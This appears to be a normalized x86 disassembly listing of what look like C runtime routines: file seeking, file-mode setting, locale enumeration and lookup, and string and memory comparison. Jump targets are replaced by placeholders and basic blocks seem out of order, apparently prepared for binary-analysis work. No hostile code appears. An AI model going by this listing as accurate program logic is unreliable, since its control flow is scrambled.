push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_40d220
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_41b630
push 0x10
push r--data
call sub_40f510
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
call sub_40e72d
jmp r-xdata
cmp ebx [ rwxdata ]
jb r-xdata
call sub_40f555
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_417b27
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_41b5bb
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b6fc
mov eax [ ebp - 0x1c ]
sub_41b704
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rwxdata ]
mov ecx [ edx ]
and esi 0x1f
shl esi 0x6
add ecx esi
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_41b7bf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4000
je r-xdata
push eax
push rwxdata
call [ InterlockedExchange@IAT ]
xor eax eax
pop ebp
retn
cmp eax 0x8000
je r-xdata
cmp eax 0x10000
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
push 0x16
pop eax
pop ebp
retn
sub_41b801
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rwxdata ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
push 0x16
pop eax
pop ebp
retn
sub_41b82e
push 0x10
push r--data
call sub_40f510
mov eax [ ebp + 0xc ]
cmp eax 0x4000
je r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
cmp eax 0x8000
je r-xdata
test ebx ebx
js r-xdata
call sub_40d1fa
mov [ eax ] 0x9
jmp r-xdata
cmp eax 0x10000
je r-xdata
call sub_40d1fa
mov [ eax ] 0x9
jmp r-xdata
cmp ebx [ rwxdata ]
jb r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x40000
je r-xdata
call sub_40e72d
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
call sub_40f555
retn
cmp eax 0x20000
je r-xdata
push ebx
call sub_417b27
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40d1fa
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0xc ]
push ebx
call sub_41b704
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b911
mov eax [ ebp - 0x1c ]
sub_41b919
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_41f090
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41ef49
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41ef49
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_41b9fb
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rwxdata ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b919
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_41f090
sub_41ba4e
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_41bb47
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_40d1fa
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_40e72d
mov eax esi
jmp r-xdata
sub_41bbc0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_41bc10
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_41bc98
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_41f1ea
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_41bd0e
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_41bc10
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_41bc10
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_40ca0e
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_41bd92
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_41bdb7
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_41bde8
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_41be03
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_41258b
mov edx edi
mov esi eax
call sub_41bdb7
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_41f1ea
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_41bd92
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40b946
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_41beaa
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_41bde8
push esi
mov edi eax
call sub_413290
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_41bf05
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_41258b
mov edx edi
lea esi [ eax + 0x9c ]
call sub_41bdb7
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_41f1ea
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_41f1ea
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_41f1ea
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_41b9fb
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_41f1ea
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_413290
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_41bd92
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_413290
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_41beaa
pop ecx
pop ecx
test eax eax
je r-xdata
sub_41c0d6
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_41258b
mov edx edi
lea esi [ eax + 0x9c ]
call sub_41bdb7
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_41f1ea
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40b946
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_41f1ea
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_41beaa
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_41c196
push [ esi + 0x4 ]
call sub_413290
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_41be03
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
retn
and [ esi + 0x8 ] 0x0
sub_41c1c2
push [ esi ]
call sub_413290
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_413290
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_41bde8
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_41bf05
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_41c229
push [ esi ]
call sub_413290
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_41bde8
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_41c0d6
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_41c265
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_41258b
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_41bc98
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_41bd0e
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_413290
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_41be03
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_41c229
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
jmp r-xdata
push edi
push 0x40
push r--data
call sub_41bc98
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_41c1c2
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_41c229
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_41c1c2
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_419700
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40e6c1
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_41f2eb
add esp 0x10
sub_41c47c
mov ax [ esi ]
cmp ax [ ecx ]
je r-xdata
xor eax eax
movzx edx [ ecx ]
movzx eax al
sub eax edx
je r-xdata
movzx eax [ esi + 0x1 ]
movzx ecx [ ecx + 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
retn
sub_41c4b8
mov eax [ esi ]
cmp eax [ ecx ]
je r-xdata
xor eax eax
movzx edx [ ecx ]
movzx eax al
sub eax edx
je r-xdata
movzx eax [ esi + 0x1 ]
movzx edx [ ecx + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ esi + 0x2 ]
movzx edx [ ecx + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
retn
movzx eax [ esi + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
retn
sub_41c528
mov edi edi
push esi
push edi
mov edi eax
jmp r-xdata
cmp edi 0x20
jae r-xdata
mov eax [ ecx ]
cmp eax [ edx ]
je r-xdata
add ecx edi
add edx edi
cmp edi 0x1f
ja r-xdata
xor eax eax
movzx esi al
movzx eax [ edx ]
sub esi eax
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_41d8f0 ]
pop edi
pop esi
retn
mov eax [ ecx + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ecx - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ ecx - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ ecx - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ ecx - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ ecx - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ ecx - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ ecx - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ecx - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ ecx - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ ecx - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ ecx - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ ecx - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ ecx - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ ecx - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ ecx - 0x1 ]
movzx ecx [ edx - 0x1 ]
sub eax ecx
je r-xdata
mov eax [ ecx - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ ecx - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ ecx - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ ecx - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ ecx - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ ecx - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ ecx - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ ecx - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ ecx - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ ecx - 0x1b ]
